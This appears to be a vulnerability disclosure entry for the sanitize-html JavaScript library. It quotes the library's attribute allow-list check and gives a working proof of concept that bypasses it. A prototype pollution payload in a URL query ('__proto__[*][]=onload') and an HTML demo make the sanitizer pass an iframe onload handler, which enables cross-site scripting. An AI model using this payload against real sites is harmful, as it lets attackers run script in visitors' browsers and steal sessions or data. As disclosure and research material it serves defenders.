## sanitize-html

URL: https://github.com/apostrophecms/sanitize-html

### Vulnerable code fragment
https://github.com/apostrophecms/sanitize-html/blob/d78ee44069b3a3bb70aca3289de63b7acbffd4f2/index.js#L275-L280
```js
          if (!allowedAttributesMap ||
            (has(allowedAttributesMap, name) && allowedAttributesMap[name].indexOf(a) !== -1) ||
            (allowedAttributesMap['*'] && allowedAttributesMap['*'].indexOf(a) !== -1) ||
            (has(allowedAttributesGlobMap, name) && allowedAttributesGlobMap[name].test(a)) ||
            (allowedAttributesGlobMap['*'] && allowedAttributesGlobMap['*'].test(a))) {
            passedAllowedAttributesMapCheck = true;
```

### PoC

```
?__proto__[*][]=onload
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
<script>
  Object.prototype['*'] = ['onload']
</script>
<script>
  document.write(sanitizeHtml('<iframe onload=alert(1)>'))
</script>
```